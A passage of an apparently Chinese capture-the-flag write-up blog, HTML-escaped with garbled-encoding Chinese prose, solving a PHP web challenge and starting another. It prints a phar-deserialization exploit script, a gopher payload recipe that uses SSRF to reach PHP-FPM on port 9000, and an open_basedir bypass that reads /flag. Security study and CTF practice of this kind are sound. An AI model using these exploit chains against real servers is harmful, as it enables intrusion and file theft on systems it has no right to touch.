&lt;span style="color:#111">$target_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$target_dir&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file_name&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">getimagesize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;tmp_name&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// getimagesizeæ£€æµ‹æ–‡ä»¶ç±»åž‹ å¯è§¦å‘ååºåˆ—åŒ–
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;File is an image - &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$check&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;mime&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;File is not an image.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$target_file&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// æ£€æµ‹åŒå å½“ç„¶å› ä¸ºmd5çš„åŽŸå› ä¹Ÿä¸å¤ªèƒ½åŒå
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry, file already exists.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;size&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">500000&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// é™åˆ¶å¤§å°
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry, your file is too large.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$imageFileType&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;jpg&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">$imageFileType&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;png&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">$imageFileType&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;gif&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">$imageFileType&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#d88200">&amp;#34;jpeg&amp;#34;&lt;/span> &lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// åŽç¼€ç™½åå•
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry, only jpg,png,gif,jpeg are allowed.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$uploadOk&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry, your file was not uploaded.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">move_uploaded_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_FILES&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;fileToUpload&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;tmp_name&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$target_file&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;The file &lt;/span>&lt;span style="color:#d88200">$file_name&lt;/span>&lt;span style="color:#d88200"> has been uploaded to ./uploads/&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// å›žæ˜¾æ–‡ä»¶è·¯å¾„
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Sorry, there was an error uploading your file.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>catchmine.phpæœ‰ä¸ªååºåˆ—åŒ–ç‚¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Easytest&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$test&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75715e">// $test = &amp;#39;1&amp;#39; æ³¨æ„ååºåˆ—åŒ–äº§ç”Ÿä¸å¯è§å­—ç¬¦ æ”¹æˆpublic
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">funny_get&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">){&lt;/span> &lt;span style="color:#75715e">// å®žçŽ°curlæ“ä½œ
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$output&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this_is_a_easy_test&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;careful&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// ååºåˆ—åŒ–å…¥å£ Easytestå®žä¾‹
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this_is_a_easy_test&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">funny_get&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å¯ä»¥è®¿é—®å†…ç½‘ è¿›è¡Œssrf
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">getimagesize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span> &lt;span style="color:#75715e">// getimagesizeæ£€æµ‹æ–‡ä»¶ç±»åž‹ å¯è§¦å‘ååºåˆ—åŒ–
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;File is an image - &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$check&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;mime&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;File is not an image.&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªssrfè‚¯å®šå°±æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œçš„ä¸œè¥¿äº†ï¼Œæ­£å¥½å¼€ç€fpmï¼Œé‚£å°±æ˜¯ssrfæ‰“9000ç«¯å£çš„fpmäº†ï¼Œphp.iniä¸­è¿˜é™åˆ¶äº†open_basedirï¼ŒåŽé¢è¿˜å¾—é¥¶ä¸€ä¸‹ï¼ˆè¿™æ˜¯å•¥å¥—å¨ƒé¢˜å•Šï¼ŒçœŸçš„å¥—&lt;/p>
&lt;p>å®³ï¼Œè¿˜å¾—åšã€‚å…ˆæ˜¯æž„é€ ç¬¬ä¸€ä¸ªpharï¼Œå°†urlè®¾ä¸º&lt;code>file:///etc/hosts&lt;/code>çœ‹å†…ç½‘åœ°å€&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Easytest&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;file:///etc/hosts&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Easytest&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// æ³¨æ„pharä¸­çš„æ˜¯Main ä¹‹åŽå†ååºåˆ—åŒ–çš„æ˜¯Easytest
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$c&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75715e">// O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Main&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Phar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exp.phar&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">startBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setStub&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;GIF89a&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">setMetadata&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">addFromString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;test.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$phar&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">stopBuffering&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ”¹åŽç¼€å’ŒMIMEä¸Šä¼ ï¼Œæ‹¿åˆ°è·¯å¾„./uploads/dce6e76f20.jpgï¼Œç„¶åŽåˆ°&lt;code>/catchmime.php?careful=&lt;/code>å¤„è§¦å‘ï¼Œcarefulå‚æ•°ä¼ å…¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119014623242.png" alt="image-20220119014623242">&lt;/p>
&lt;p>è¿™çœ‹äº†ä¸ªå¯‚å¯žï¼Œå¯„ï¼Œç›´æŽ¥çœ‹/proc/net/arpå§&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119015548163.png" alt="image-20220119015548163">&lt;/p>
&lt;p>å°´å°¬å°±å°´å°¬åœ¨è¿™ä¿©éƒ½ä¸æ˜¯æˆ‘ä»¬ç›´æŽ¥çš„ipï¼Œæƒ³æ‰¾çš„é¶æœºå°±åœ¨è¿™ä¸ªç½‘æ®µé‡Œï¼Œä½†æ˜¯æˆ‘éƒ½åŠ å‡5ä½äº†ï¼Œéƒ½æ²¡æ‰¾åˆ°æˆ‘ä»¬çš„ç›®æ ‡é¶æœºâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦åŠ å‡5ä½å·²ç»å¾ˆå¤šäº†â€¦â€¦&lt;/p>
&lt;p>å¯„ã€‚åŽé¢çš„æµç¨‹æˆ‘ç®€å•è¯´ä¸€ä¸‹å§ï¼Œæ‡’å¾—æœ¬åœ°æ­çŽ¯å¢ƒï¼Œå°±äº‘äº†ï¼Œå°±æ˜¯æ‘†ã€‚&lt;/p>
&lt;p>é¦–å…ˆç”¨pç‰›é‚£ä¸ªfpmçš„è„šæœ¬æž„é€ gopherçš„payload&lt;/p>
&lt;pre tabindex="0">&lt;code>python fpm.py ip '/var/www/html/index.php' -p 9000 -c &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>å°†ç”Ÿæˆçš„payloadå‰é¢åŠ ä¸Š&lt;code>gopher://ip:9000/_&lt;/code>ï¼Œæ”¾å…¥å‰é¢æž„é€ pharè„šæœ¬çš„urlå‚æ•°ä¸­ï¼Œä¸Šä¼ å¹¶è§¦å‘ï¼Œå›žæ˜¾æ­£å¸¸&lt;/p>
&lt;p>å› ä¸ºè¿˜æœ‰disable_functionså’Œopen_basedirçš„å­˜åœ¨ï¼Œæ‰€ä»¥å†ç»•ä¸€ä¸‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/fuck&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/tmp/fuck&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;open_basedir&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;open_basedir&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75af00">print_r&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">scandir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#75af00">readfile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">// è¿™é‡Œçš„éƒ¨åˆ†ä½œä¸ºfpm.pyçš„å‚æ•°ç”Ÿæˆæ–°çš„gopher payload
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å†ä¼ pharï¼Œå†è§¦å‘å°±èƒ½çœ‹flagäº†&lt;/p>
&lt;p>â€”â€”â€”â€”æ„Ÿæƒ³ï¼š19å¹´è¿™æ ·çš„å°±æ˜¯éš¾é¢˜äº†ï¼Œä½†æ˜¯æ”¾åˆ°2021ï¼Œä¸å¯¹ 2022å¹´ï¼Œè¿™æ ·çš„é¢˜å°±æ˜¯çº¯å¥—å¨ƒè€Œä¸éš¾äº†ï¼Œä¾§é¢åæ˜ ctfçœŸä»–å¦ˆçš„å¤ªå·äº†ï¼Œå¯„&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[2021ç¥¥äº‘æ¯]cralwer_z
&lt;/h4>
&lt;/summary>
&lt;p>å””ï¼Œæˆ‘ä»¥ä¸ºæˆ‘å½“æ—¶æ‰“äº†ï¼Œä½†æ˜¯å¥½åƒå¹¶æ²¡æœ‰ï¼ˆå°´å°¬&lt;/p>
&lt;p>æ³¨å†Œè´¦å·ç™»å…¥ï¼Œåªæœ‰ä¿®æ”¹profileä¸€ä¸ªé€‰é¡¹ï¼Œå¯ä»¥æ”¹username, affilication, age, Bucketï¼›çœ‹ä¸‹æºç &lt;/p>
&lt;p>index.jså¤„ç†/signup, /signin, /logoutï¼Œuser.jså¤„ç†/user/profileï¼Œé‡ç‚¹çœ‹ä¸‹è¿™è¾¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">router&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/profile&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
